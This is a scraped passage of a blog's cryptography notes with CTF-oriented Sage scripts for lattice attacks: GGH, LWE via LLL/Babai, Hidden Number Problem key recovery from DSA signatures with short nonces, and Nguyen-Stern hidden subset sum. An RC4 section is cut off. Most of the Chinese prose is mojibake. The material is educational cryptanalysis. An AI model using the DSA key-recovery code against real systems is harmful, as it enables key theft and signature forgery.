(B*2).solve_left(new_c - shortest_vector[:-1])m = mbar * (2*delta) + m6print(bytes.fromhex(hex(m)[2:])) 12345678910111213# Sage# e=mW+rfrom sage.modules.free_module_integer import IntegerLatticeW = e = B = W.stack(e).augment(vector([0] * W.ncols() + [1]))r = IntegerLattice(B).shortest_vector()print(&#x27;r = &#123;&#125;&#x27;.format(r))m = W.solve_left(e - r[:-1])print(&#x27;m = &#123;&#125;&#x27;.format(m)) å‚è€ƒ GGH encryption scheme GYCTF 2020 - GGH â€‹ LWEé—®é¢˜å®¹é”™å­¦ä¹ é—®é¢˜ ï¼ˆLWEé—®é¢˜ï¼Œ Learning With Errorsï¼‰æ˜¯ä¸€ä¸ªæœºå™¨å­¦ä¹ é¢†åŸŸä¸­çš„æ€€ç–‘éš¾è§£é—®é¢˜ï¼Œç”±Oded Regev åœ¨2005å¹´æå‡ºï¼Œä»–å› æ­¤èµ¢å¾—2018å¹´å“¥å¾·å°”å¥–ã€‚è¿™æ˜¯ä¸€ä¸ªææ€§å­¦ä¹ é—®é¢˜çš„ä¸€èˆ¬å½¢å¼ã€‚ å®šä¹‰ éšæœºé€‰å–ä¸€ä¸ªçŸ©é˜µ $\\mathbf{A} \\in \\mathbb{Z}_q^{m \\times n}$ï¼Œä¸€ä¸ªéšæœºå‘é‡ $\\mathbf{s} \\in \\mathbb{Z}_q^n$ï¼Œå’Œä¸€ä¸ªéšæœºçš„å™ªéŸ³ $\\mathbf{e} \\in \\varepsilon^m$ã€‚ ä¸€ä¸ªLWEç³»ç»Ÿçš„è¾“å‡º $g_\\mathbf{A}(\\mathbf{s, e}) = \\mathbf{As + e} \\pmod q$ã€‚ ä¸€ä¸ªLWEé—®é¢˜æ˜¯ï¼Œç»™å®šä¸€ä¸ªçŸ©é˜µ $\\mathbf{A}$ï¼Œå’ŒLWEç³»ç»Ÿçš„è¾“å‡º $g_\\mathbf{A}(\\mathbf{s, e})$ï¼Œè¿˜åŸ $\\mathbf{s}$ã€‚ LWEçš„è¯¯å·®å‘é‡æ˜¯ä¸€ä¸ªæ»¡è¶³æ­£æ€åˆ†å¸ƒçš„å°å‘é‡ã€‚ å› ä¸ºåŠ å…¥äº†ä¸€äº›è¯¯å·®ï¼Œå¦‚æœä½¿ç”¨é«˜æ–¯æ¶ˆå…ƒæ³•çš„è¯ï¼Œè¿™äº›è¯¯å·®ä¼šèšé›†èµ·æ¥ï¼Œä½¿å¾—è§£å‡ºæ¥çš„ä¸œè¥¿è·Ÿå®é™…å€¼å·®å¾ˆå¤šã€‚ æ±‚è§£ æ„é€ çŸ©é˜µï¼š $L = \\begin{bmatrix} I &amp; A \\newline 0 &amp; b \\end{bmatrix}$ åˆ©ç”¨LLLç®—æ³•å’ŒBabaiæœ€è¿‘å¹³é¢ç®—æ³•ï¼Œå¯ä»¥åœ¨å¤šé¡¹å¼æ—¶é—´å†…æ‰¾åˆ°SVPè¿‘ä¼¼è§£ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344#è„šæœ¬1-å°è§„æ¨¡#Sagefrom sage.modules.free_module_integer import IntegerLatticerow = column = prime = ma = res = W = matrix(ZZ, ma)cc = vector(ZZ, res)# Babai&#x27;s Nearest Plane algorithmdef Babai_closest_vector(M, G, target): small = target for _ in range(5): for i in reversed(range(M.nrows())): c = ((small * G[i]) / (G[i] * G[i])).round() small -= M[i] * c return target - smallA1 = matrix.identity(column)Ap = matrix.identity(row) * primeB = block_matrix([[Ap], [W]]) lattice = IntegerLattice(B, lll_reduce=True)print(&quot;LLL done&quot;)gram = lattice.reduced_basis.gram_schmidt()[0]target = vector(ZZ, res)re = Babai_closest_vector(lattice.reduced_basis, gram, target)print(&quot;Closest Vector: &#123;&#125;&quot;.format(re))R = IntegerModRing(prime)M = Matrix(R, ma)M = M.transpose()ingredients = M.solve_right(re)print(&quot;Ingredients: &#123;&#125;&quot;.format(ingredients))m = &#x27;&#x27;for i in range(len(ingredients)): m += chr(ingredients[i])print(m) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#è„šæœ¬2-å¤§è§„æ¨¡#Sagefrom sage.modules.free_module_integer import IntegerLatticefrom random import randintimport sysfrom itertools import starmapfrom operator import mul# Babai&#x27;s Nearest Plane algorithm# from: http://mslc.ctf.su/wp/plaidctf-2016-sexec-crypto-300/def Babai_closest_vector(M, G, target): small = target for _ in range(1): for i in reversed(range(M.nrows())): c = ((small * G[i]) / (G[i] * G[i])).round() small -= M[i] * c return target - smallm = n = q = A_values = b_values = A = matrix(ZZ, m + n, m)for i in range(m): A[i, i] = qfor x in range(m): for y in range(n): A[m + y, x] = A_values[x][y]lattice = IntegerLattice(A, lll_reduce=True)print(&quot;LLL done&quot;)gram = lattice.reduced_basis.gram_schmidt()[0]target = vector(ZZ, b_values)res = Babai_closest_vector(lattice.reduced_basis, gram, target)print(&quot;Closest Vector: &#123;&#125;&quot;.format(res))R = IntegerModRing(q)M = Matrix(R, A_values)ingredients = M.solve_right(res)print(&quot;Ingredients: &#123;&#125;&quot;.format(ingredients))for row, b in zip(A_values, b_values): effect = sum(starmap(mul, zip(map(int, ingredients), row))) % q assert(abs(b - effect) &lt; 2 ** 37)print(&quot;ok&quot;) åˆ©ç”¨Embedding Techniqueæ„é€ ä¸€ä¸ªEmbedding Latticeï¼Œä¹Ÿå¯ä»¥è§£SVPã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041# SageDEBUG = Falsem = 44n = 55p = 2^5q = 2^10def errorV(): return vector(ZZ, [1 - randrange(3) for _ in range(n)])def vecM(): return vector(ZZ, [p//2 - randrange(p) for _ in range(m)])def vecN(): return vector(ZZ, [p//2 - randrange(p) for _ in range(n)])def matrixMn(): mt = matrix(ZZ, [[q//2 - randrange(q) for _ in range(n)] for _ in range(m)]) return mtA = matrixMn()e = errorV()x = vecM()b = x*A+eif DEBUG: print(&#x27;A = \\n%s&#x27; % A) print(&#x27;x = %s&#x27; % x) print(&#x27;b = %s&#x27; % b)print(&#x27;e = %s&#x27; % e)z = matrix(ZZ, [0 for _ in range(m)]).transpose()beta = matrix(ZZ, [1])T = block_matrix([[A, z], [matrix(b), beta]])if DEBUG: print(&#x27;T = \\n%s&#x27; % T)print(&#x27;-----&#x27;)L = T.LLL()print(L[0])print(L[0][:n] == e) å‚è€ƒ åˆæ¢å…¨åŒæ€åŠ å¯†ä¹‹äºŒï¼šæ ¼å¯†ç å­¦ä¸LWEé—®é¢˜ ç¥¥äº‘æ¯ 2020 - easy matrix Aero CTF 2020 - Magic II XNUCA2020 - diamond 2022 DASCTF 7æœˆèµ‹èƒ½èµ› - LWE? â€‹ éšè—æ•°é—®é¢˜ï¼ˆHNP / Hidden Number Problemï¼‰ç”±DSAç­¾åä¸­å„å‚æ•°çš„å…³ç³»ï¼š $r \\equiv g^k \\pmod q$ $s \\equiv k^{-1}(H(m)+xr) \\equiv q$ å¯å¾—æ¯è½®ä¸´æ—¶å¯†é’¥ä¸ç­¾åã€æ˜æ–‡çš„å…³ç³»ï¼š $k_i \\equiv s_i^{-1}r_i \\cdot x+s_i^{-1}H(m) \\pmod q$ $k_i \\equiv A_ix+B_i \\pmod q$ $k_i = A_ix+B_i+l_iq$ å…¶ä¸­ $k_i$ å°±æ˜¯æ¯æ¬¡ä½¿ç”¨çš„ä¸´æ—¶å¯†é’¥ï¼Œ$A_i = s_i^{-1}r,B_i = s_i^{-1}H(m)$ã€‚ æ„å»ºæ ¼ï¼š $M =\\begin{bmatrix}q &amp; &amp; &amp; &amp; &amp; &amp; \\newline&amp; q &amp; &amp; &amp; &amp; &amp; \\newline&amp; &amp;\\ddots&amp; &amp; &amp; &amp; \\newline&amp; &amp; &amp; q &amp; &amp; &amp; \\newlineA_1&amp;A_2&amp;\\dots &amp; A_t&amp;K/q&amp; &amp; \\newlineB_1&amp;B_2&amp;\\dots &amp; B_t&amp; &amp; K &amp; \\newline\\end{bmatrix}$ ï¼ˆå…¶ä¸­ $K$ æ˜¯ $k$ çš„ä¸Šç•Œï¼Œä¾‹å¦‚ $k$ çš„ä½æ•°å°äºç­‰äº121æ—¶ï¼Œé‚£ä¹ˆ $K=2^{122}$ï¼‰ ä¸éš¾å‘ç°ï¼Œå­˜åœ¨ä¸€ä¸ª $M$ çš„æ•´ç³»æ•°çº¿æ€§ç»„åˆ $v$ï¼Œå¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„ $v_k$ã€‚ $vM =\\begin{bmatrix}l_1 &amp; l_2 &amp; \\cdots &amp; l_t &amp; x &amp; 1\\end{bmatrix}\\begin{bmatrix}q &amp; &amp; &amp; &amp; &amp; &amp; \\newline&amp; q &amp; &amp; &amp; &amp; &amp; \\newline&amp; &amp;\\ddots&amp; &amp; &amp; &amp; \\newline&amp; &amp; &amp; q &amp; &amp; &amp; \\newlineA_1&amp;A_2&amp;\\dots &amp; A_t&amp;K/q&amp; &amp; \\newlineB_1&amp;B_2&amp;\\dots &amp; B_t&amp; &amp; K &amp; \\newline\\end{bmatrix} = \\begin{bmatrix}k_1 &amp;k_2 &amp;\\cdots &amp;k_t &amp;Kx/q &amp;K\\end{bmatrix}= v_k$ å› æ­¤ $v_k$ å³ä¸º $M$ ä¸Šçš„ä¸€ä¸ªæ ¼ç‚¹ï¼Œä¸”é•¿åº¦å¾ˆçŸ­ï¼Œå¯ä»¥ç”¨LLLç®—æ³•æ±‚å‡ºã€‚ æ³¨ï¼šæœ‰å¦ä¸€ä¸ªçŸ­å‘é‡ $v=(0,0,â‹¯,K,0)$ ä¹Ÿåœ¨æ ¼ä¸Šï¼Œä¸”è¿™ä¸ªçŸ­å‘é‡æ¯” $(k_1, k_2, \\cdots, k_t, Kx/n, K)$ è¿˜è¦çŸ­ã€‚æ­¤å¤–ï¼Œå¤šæ¬¡æµ‹è¯•å‘ç°ï¼Œ$v_k$ æ€»ä¼šå‡ºç°åœ¨LLLåçš„ç¬¬äºŒè¡Œã€‚ 1234567891011121314151617181920212223242526272829303132import jsont = 40# Load dataf = open(&quot;data&quot;, &quot;r&quot;)(q, Hm_s, r_s, s_s) = json.load(f)# Calculate A &amp; BA = []B = []for r, s, Hm in zip(r_s, s_s, Hm_s): A.append( ZZ( (inverse_mod(s, q)*r) % q ) ) B.append( ZZ( (inverse_mod(s, q)*Hm) % q ) )# Construct LatticeK = 2^122 # ki &lt; 2^122X = q * identity_matrix(QQ, t) # t * tZ = matrix(QQ, [0] * t + [K/q] + [0]).transpose() # t+1 columnZ2 = matrix(QQ, [0] * (t+1) + [K]).transpose() # t+2 columnY = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]]) # (t+2) * tY = block_matrix([[Y, Z, Z2]])# Find short vectorY = Y.LLL()# checkk0 = ZZ(Y[1, 0] % q)x = ZZ(Y[1, -2] / (K/q) % q)assert(k0 == (A[0]*x + B[0]) % q)print(x) å‚è€ƒ The Dark Side of the Hidden Number Problem: Lattice Attacks on DSA [HNP] ä¸€ç±»åŸºäºå„ç§DSAçš„HNPé—®é¢˜æ±‚è§£ NPUCTF 2020 - babyLCG RCTF 2022 - IS_THIS_LCG â€‹ éšå­é›†å’Œé—®é¢˜ï¼ˆHSSP / Hidden Subset Sum Problemï¼‰$w=vG$ï¼Œå…¶ä¸­ $w,v$ ä¸º $\\text{GF}(p)$ ä¸Šçš„å‘é‡ï¼Œ$G$ ä¸º01çŸ©é˜µï¼ˆ$g_{ij} \\in \\{ 0,1 \\}$ï¼‰ï¼Œå·²çŸ¥ $w$ï¼Œæ¢å¤çŸ©é˜µ $G$ã€‚ æ±‚è§£ç®—æ³• Nguyen-Stern Algorithmï¼Œä½¿ç”¨ orthogonal lattice å®ç°ã€‚ å‚è€ƒï¼š A Polynomial-Time Algorithm for Solving the Hidden Subset Sum Problem AIS3 EOF CTF Quals 2021 - notPRNG Zer0pts CTF 2022 - Karen solving_hssp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125from Crypto.Util.number import *n = 60m = 330p = ...w = ...MM = ...e = 0x10001MM = matrix(GF(2), MM)def allpmones(v): return len([vj for vj in v if vj in [-1, 0, 1]]) == len(v)# We generate the lattice of vectors orthogonal to b modulo x0def orthoLattice(b, x0): m = b.length() M = Matrix(ZZ, m, m) for i in range(1, m): M[i, i] = 1 M[1:m, 0] = -b[1:m] * inverse_mod(b[0], x0) M[0, 0] = x0 for i in range(1, m): M[i, 0] = mod(M[i, 0], x0) return Mdef allones(v): if len([vj for vj in v if vj in [0, 1]]) == len(v): return v if len([vj for vj in v if vj in [0, -1]]) == len(v): return -v return Nonedef recoverBinary(M5): lv = [allones(vi) for vi in M5 if allones(vi)] n = M5.nrows() for v in lv: for i in range(n): nv = allones(M5[i] - v) if nv and nv not in lv: lv.append(nv) nv = allones(M5[i] + v) if nv and nv not in lv: lv.append(nv) return Matrix(lv)def kernelLLL(M): n = M.nrows() m = M.ncols() if m &lt; 2 * n: return M.right_kernel().matrix() K = 2 ^ (m // 2) * M.height() MB = Matrix(ZZ, m + n, m) MB[:n] = K * M MB[n:] = identity_matrix(m) MB2 = MB.T.LLL().T assert MB2[:n, : m - n] == 0 Ke = MB2[n:, : m - n].T return Kedef attack(m, n, p, h): # This is the Nguyen-Stern attack, based on BKZ in the second step print(&quot;n =&quot;, n, &quot;m =&quot;, m) iota = 0.035 nx0 = int(2 * iota * n ^ 2 + n * log(n, 2)) print(&quot;nx0 =&quot;, nx0) x0 = p b = vector(h) # only information we get M = orthoLattice(b, x0) t = cputime() M2 = M.LLL() print(&quot;LLL step1: %.1f&quot; % cputime(t)) # assert sum([vi == 0 and 1 or 0 for vi in M2 * X]) == m - n MOrtho = M2[: m - n] print(&quot; log(Height, 2) = &quot;, int(log(MOrtho.height(), 2))) t2 = cputime() ke = kernelLLL(MOrtho) print(&quot; Kernel: %.1f&quot; % cputime(t2)) print(&quot; Total step1: %.1f&quot; % cputime(t)) if n &gt; 170: return beta = 2 tbk = cputime() while beta &lt; n: if beta == 2: M5 = ke.LLL() else: M5 = M5.BKZ(block_size=beta) # we break when we only get vectors with &#123;-1,0,1&#125; components if len([True for v in M5 if allpmones(v)]) == n: break if beta == 2: beta = 10 else: beta += 10 print(&quot;BKZ beta=%d: %.1f&quot; % (beta, cputime(tbk))) t2 = cputime() MB = recoverBinary(M5) print(&quot; Recovery: %.1f&quot; % cputime(t2)) print(&quot; Number of recovered vector = &quot;, MB.nrows()) print(&quot; Number of recovered vector.T = &quot;, MB.ncols()) return MBres = attack(m, n, p, w) â€‹ éšçº¿æ€§ç»„åˆé—®é¢˜ï¼ˆHLCP / Hidden Linear Combination Problemï¼‰$w=vG$ï¼Œå…¶ä¸­ $w,v$ ä¸º $\\text{GF}(p)$ ä¸Šçš„å‘é‡ï¼Œ$G$ ä¸º $0$ è‡³ $B$ ä¹‹é—´æ•´æ•°å€¼çŸ©é˜µï¼ˆ$g_{ij} \\in [0,B] \\cap\\mathbb{Z}$ï¼‰ï¼Œå·²çŸ¥ $w$ï¼Œæ¢å¤çŸ©é˜µ $G$ã€‚ å‚è€ƒï¼š Provably Solving the Hidden Subset Sum Problem via Statistical Learning 2022å¼ºç½‘æ¯ - Lattice solving_hssp â€‹ æ–¹ç¨‹é—®é¢˜ $aX \\equiv b \\pmod p$ $X$ æ˜¯å¤§çš„æ•°ï¼Œ$a$ å’Œ $b$ æ˜¯å°çš„æ•°ï¼Œå¯å†™æˆ $aX+kp=b$ æˆ– $aX-kp=b$ï¼Œå·²çŸ¥ $X$ å’Œ $p$ï¼Œæ±‚ $a$ å’Œ $b$ã€‚ Wienerâ€™s $\\Big\\vert \\cfrac{X}{p}-\\cfrac{k}{a} \\Big\\vert \\le \\cfrac{1}{2a^2}$ ç”¨è¿åˆ†æ•°æ–¹æ³•ï¼Œç”¨ $\\cfrac{X}{p}$ æ±‚å‡º $k$ å’Œ $a$ï¼Œè¿›è€Œè§£å‡º $b$ã€‚ Lattices æ„é€  $(a,k) \\begin{bmatrix} 1 &amp; X \\newline 0 &amp; p\\end{bmatrix} = (a,b)$ï¼Œè®°ä¸º $A\\cdot M=B$ã€‚ $B$ æœ‰å¾ˆå¤§æ¦‚ç‡ä¸º $M$ é‡Œçš„æœ€çŸ­å‘é‡ï¼Œä½¿ç”¨LLLç®—æ³•reduceåå¯æ±‚å‡ºæœ€çŸ­å‘é‡ï¼Œå³è§£å‡º $B=(a, b) $ã€‚ â€‹ $a_iX_i \\equiv B \\pmod p$ $B$ æ˜¯æœªçŸ¥å¤§æ•°ï¼Œ$X$ æ˜¯å¤§çš„æ•°ï¼Œ$a$ æ˜¯å°çš„æ•°ï¼Œå·²çŸ¥ $X$ å’Œ $p$ï¼Œæ±‚ $a$ å’Œ $B$ã€‚å¦‚æœæœ‰å¤šç»„è¿™æ ·çš„å¼å­ï¼Œå¯ä»¥è½¬åŒ–æˆ $aX \\equiv b \\pmod p$ çš„æƒ…å†µã€‚ è½¬åŒ–ä¸º $a_iB^{-1} \\equiv X_i^{-1} \\pmod p$ï¼Œæ¶ˆå»æœªçŸ¥æ•° $B$ï¼Œæœ‰ï¼š $aâ€™=X_1B^{-1} \\bmod p = a_1 \\bmod p$ $bâ€™=X_2B^{-1} \\bmod p = a_2 \\bmod p$ $Xâ€™=X_1^{-1}X_2 \\bmod p = a_1^{-1}a_2 \\bmod p$ å³ $aâ€™Xâ€™ \\equiv bâ€™ \\pmod p$ï¼Œå¯¹åº” $a_iB^{-1} \\equiv X_i^{-1} \\pmod p$ æ±‚è§£ã€‚ â€‹ $\\sum\\limits_{i=1}^n a_iX_i \\equiv b \\pmod p$ æ„é€  $(a_1,a_2,\\cdots,a_n,k)\\begin{pmatrix} 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; X_1 \\newline 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; X_2 \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; X_n \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; p \\end{pmatrix}=(a_1,a_2,\\cdots,a_n,b)$ï¼Œè®°ä¸º $A\\cdot M=B$ã€‚ åªè¦æœ‰ $a=\\max(a_i) \\le O(p^{\\frac{1}{n+1}})$ å°±å¯è§£ $a_i$ã€‚ â€‹ $\\sum\\limits_{i=1}^n a_iX_i \\equiv Y \\pmod p$ $Y$ æ˜¯å·²çŸ¥å¤§æ•°ï¼ŒèƒŒåŒ…å¯†ç è§£æ³•ã€‚ æ„é€  $(a_1,a_2,\\cdots,a_n,k,-1)\\begin{pmatrix} 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; X_1 \\newline 0 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; X_2 \\newline \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots \\newline 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; 0 &amp; X_n \\newline 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 1&amp; p \\newline 1 &amp; 1 &amp; 1 &amp; \\cdots &amp; 1 &amp; 1&amp; Y\\end{pmatrix}=(a_1-1,a_2-1,\\cdots,a_n-1,k-1,0)$ï¼Œè®°ä¸º $A\\cdot M=B$ã€‚ æ³¨æ„åˆ° $B$ çš„æœ€åä¸€ä¸ªå…ƒç´ æ˜¯0ï¼Œæ‰€ä»¥å¦‚æœ $M$ çš„æœ€åä¸€åˆ—å’Œ $B$ çš„æœ€åä¸€ä¸ªå…ƒç´ åŒä¹˜ä¸€ä¸ªè¶…å¤§çš„ $C$ çš„è¯ï¼ˆå³ $M$ å’Œ $B$ åŒä¹˜ä¸€ä¸ªå¯¹è§’é˜µ $D$ï¼Œ$D$ çš„å¯¹è§’çº¿ä¸Šçš„æœ€å³ä¸‹ä¸€ä¸ªæ˜¯ $C$ï¼Œå…¶ä»–æ˜¯1ï¼‰ï¼Œ$\\det(M)$ ä¼šå˜å¤§ï¼Œè€Œ $B$ åˆ™ä¸å˜ã€‚æ‰€ä»¥å¦‚æœ $C$ è¶³å¤Ÿå¤§çš„è¯ï¼Œå³å¯è§£ $a_i$ã€‚ â€‹ $a_iX_i \\equiv b_i \\pmod {P+s}$ å‡è®¾åŸæ¥çš„ $p$ å¯ä»¥æ‹†æˆ $P+s$ï¼Œ$P$ å·²çŸ¥ï¼Œ$s$ æœªçŸ¥ä½†ä¸€å®šä¼šå­˜åœ¨ã€‚å¦‚RSAä¸­ï¼Œ$\\varphi(N)$ å¹¶ä¸çŸ¥é“ï¼Œä½†ä¼šçŸ¥é“ $N=\\varphi(N)+[1-(p+q)]$ï¼Œç”¨ç±»ä¼¼æ‰©å±•ç»´çº³æ”»å‡»çš„æ–¹æ³•å¯ä»¥ç”¨ $P+s$ ä»£æ›¿ $P$ï¼Œç„¶åç”¨æ ¼çš„æ–¹æ³•åšï¼Œä½†éœ€è¦çš„ $a$ å’Œ $b$ è¦æ›´å°ã€‚ å¯¹äºä¸¤ç»„æƒ…å†µï¼š $\\begin{cases} a_1X_1 \\equiv b_1 \\pmod {P+s} \\newline a_2X_2 \\equiv b_2 \\pmod {P+s}\\end{cases}$ æ„é€  $(k_1k_2,a_1k_2,a_2k_1,a_1a_2)\\begin{pmatrix} 1 &amp; P &amp; 0 &amp; P^2 \\newline 0 &amp; X_1 &amp; X_1 &amp; X_1P \\newline 0 &amp; 0 &amp; -X_2 &amp; X_2P \\newline 0 &amp; 0 &amp; 0 &amp; X_1X_2 \\end{pmatrix}=(k_1k_2,k_2(b_1-sk_2),b_1k_2-b_2k_1,(b_1-k_1s)(b_2-k_2s))$ï¼Œè®°ä¸º $A\\cdot M=B$ã€‚ â€‹ $x_i=q_ip+r_i$ $x_i$ å·²çŸ¥ï¼Œ$p$ ä¸º $\\alpha$ ä½ï¼Œ$q_i$ ä¸º $\\beta$ ä½ ï¼Œ$r_i$ ä¸º $\\rho$ ä½ï¼ˆ$\\rho \\lt\\lt \\alpha$ï¼‰ï¼Œæ±‚ $p$ã€‚ ACDé—®é¢˜ï¼ˆApproximate Common Divisior Problemï¼‰ã€‚ æ„é€  $(q_0,q_1,\\cdots,q_t)\\begin{pmatrix} 2^{\\rho} &amp; x_1 &amp; x_2 &amp; \\cdots &amp; x_t \\newline 0 &amp; -x_0 &amp; 0 &amp; \\cdots &amp; 0 \\newline 0 &amp; 0 &amp; -x_0 &amp; \\cdots &amp; 0 \\newline \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\newline 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; -x_0\\end{pmatrix}=(q_02^{\\rho},q_0x_1-q_1x_0,\\cdots,q_0x_t-q_tx_0)=(q_02^{\\rho},q_0r_1-q_1r_0,\\cdots,q_0r_t-q_tr_0)$ï¼Œè®°ä¸º $A\\cdot M=B$ã€‚ ä½¿ç”¨LLLç®—æ³•reduceåå¾—åˆ° $q_02^{\\rho}$ã€‚ å‚è€ƒï¼š WMCTF 2021 - easylsb å‚è€ƒï¼šWienerâ€™s v.s Lattices â€”â€” aX=b%p çš„æ–¹ç¨‹è§£æ³•ç¬”è®°","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"æ ¼å¯†ç ","slug":"æ ¼å¯†ç ","permalink":"https://lazzzaro.github.io/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"æµå¯†ç ","slug":"crypto-æµå¯†ç ","date":"2020-11-06T16:35:40.000Z","updated":"2023-01-08T06:08:46.935Z","comments":true,"path":"2020/11/07/crypto-æµå¯†ç /","permalink":"https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/","excerpt":"","text":"â€‹ åœ¨å¯†ç å­¦ä¸­ï¼Œæµå¯†ç ï¼ˆè‹±è¯­ï¼šStream cipherï¼‰ï¼Œåˆè¯‘ä¸ºæµåŠ å¯†ã€èµ„æ–™æµåŠ å¯†ï¼Œæ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼ŒåŠ å¯†å’Œè§£å¯†åŒæ–¹ä½¿ç”¨ç›¸åŒä¼ªéšæœºåŠ å¯†æ•°æ®æµï¼ˆpseudo-random streamï¼‰ä½œä¸ºå¯†é’¥ï¼Œæ˜æ–‡æ•°æ®æ¯æ¬¡ä¸å¯†é’¥æ•°æ®æµé¡ºæ¬¡å¯¹åº”åŠ å¯†ï¼Œå¾—åˆ°å¯†æ–‡æ•°æ®æµã€‚å®è·µä¸­æ•°æ®é€šå¸¸æ˜¯ä¸€ä¸ªä½ï¼ˆbitï¼‰å¹¶ç”¨å¼‚æˆ–ï¼ˆxorï¼‰æ“ä½œåŠ å¯†ã€‚ ä¼ªéšæœºå¯†é’¥æµï¼ˆkeystreamï¼‰ç”±ä¸€ä¸ªéšæœºçš„ç§å­ï¼ˆseedï¼‰é€šè¿‡ç®—æ³•ï¼ˆç§°ä¸ºï¼šPRGï¼Œpseudo-random generatorï¼‰å¾—åˆ°ï¼Œ$k$ ä½œä¸ºç§å­ï¼Œåˆ™ $G(k)$ ä½œä¸ºå®é™…ä½¿ç”¨çš„å¯†é’¥è¿›è¡ŒåŠ å¯†è§£å¯†å·¥ä½œã€‚ä¸ºäº†ä¿è¯æµåŠ å¯†çš„å®‰å…¨æ€§ï¼ŒPRGå¿…é¡»æ˜¯ä¸å¯é¢„æµ‹çš„ã€‚è¯¥ç®—æ³•è§£å†³äº†å¯¹ç§°åŠ å¯†å®Œå–„ä¿å¯†æ€§ï¼ˆperfect secrecyï¼‰çš„å®é™…æ“ä½œå›°éš¾ï¼Œç”±äºå®Œå–„ä¿å¯†æ€§è¦æ±‚å¯†é’¥é•¿åº¦ä¸çŸ­äºæ˜æ–‡é•¿åº¦ï¼Œæ•…è€Œå®é™…æ“ä½œå­˜åœ¨å›°éš¾ï¼Œæ”¹ç”±è¾ƒçŸ­æ•°æ®æµé€šè¿‡ç‰¹å®šç®—æ³•å¾—åˆ°å¯†é’¥æµã€‚ RC4åœ¨å¯†ç å­¦ä¸­ï¼ŒRC4ï¼ˆæ¥è‡ªRivest Cipher 4çš„ç¼©å†™ï¼‰æ˜¯ä¸€ç§æµåŠ å¯†ç®—æ³•ï¼Œå¯†é’¥é•¿åº¦å¯å˜ã€‚å®ƒåŠ è§£å¯†ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œå› æ­¤ä¹Ÿå±äºå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚RC4æ˜¯æœ‰çº¿ç­‰æ•ˆåŠ å¯†ï¼ˆWEPï¼‰ä¸­é‡‡ç”¨çš„åŠ å¯†ç®—æ³•ï¼Œä¹Ÿæ›¾ç»æ˜¯TLSå¯é‡‡ç”¨çš„ç®—æ³•ä¹‹ä¸€ã€‚ ç”±ç¾å›½å¯†ç å­¦å®¶ç½—çº³å¾·Â·æç»´æ–¯ç‰¹ï¼ˆRonald Rivestï¼‰åœ¨1987å¹´è®¾è®¡çš„ã€‚ç”±äºRC4ç®—æ³•å­˜åœ¨å¼±ç‚¹ï¼Œ2015å¹´2æœˆæ‰€å‘å¸ƒçš„ RFC 7465 è§„å®šç¦æ­¢åœ¨TLSä¸­ä½¿ç”¨RC4åŠ å¯†ç®—æ³•ã€‚ RC4ç”±ä¼ªéšæœºæ•°ç”Ÿæˆå™¨å’Œå¼‚æˆ–è¿ç®—ç»„æˆã€‚RC4çš„å¯†é’¥é•¿åº¦å¯å˜ï¼ŒèŒƒå›´æ˜¯[1,255]ã€‚RC4ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚åœ°åŠ è§£å¯†ã€‚ç»™å®šä¸€ä¸ªå¯†é’¥ï¼Œä¼ªéšæœºæ•°ç”Ÿæˆå™¨æ¥å—å¯†é’¥å¹¶äº§ç”Ÿä¸€ä¸ªSç›’ã€‚Sç›’ç”¨æ¥åŠ å¯†æ•°æ®ï¼Œè€Œä¸”åœ¨åŠ å¯†è¿‡ç¨‹ä¸­Sç›’ä¼šå˜åŒ–ã€‚ ç”±äºå¼‚æˆ–è¿ç®—çš„å¯¹åˆæ€§ï¼ŒRC4åŠ å¯†è§£å¯†ä½¿ç”¨åŒä¸€å¥—ç®—æ³•ã€‚ ç®—æ³• KSA åˆå§‹åŒ–é•¿åº¦ä¸º256çš„Sç›’ã€‚ç¬¬ä¸€ä¸ªforå¾ªç¯å°†0åˆ°255çš„äº’ä¸é‡å¤çš„å…ƒç´ è£…å…¥Sç›’ã€‚ç¬¬äºŒä¸ªforå¾ªç¯æ ¹æ®å¯†é’¥æ‰“ä¹±Sç›’ã€‚ 12345678for i from 0 to 255 S[i] := iendforj := 0for( i=0 ; i&lt;256 ; i++) j := (j + S[i] + key[i mod keylength]) % 256 swap values of S[i] and S[j]endfor PRGA ä¸‹é¢i,jæ˜¯ä¸¤ä¸ªæŒ‡é’ˆã€‚æ¯æ”¶åˆ°ä¸€ä¸ªå­—èŠ‚ï¼Œå°±è¿›è¡Œwhileå¾ªç¯ã€‚é€šè¿‡ä¸€å®šçš„ç®—æ³•ï¼ˆ(a),(b)ï¼‰å®šä½Sç›’ä¸­çš„ä¸€ä¸ªå…ƒç´ 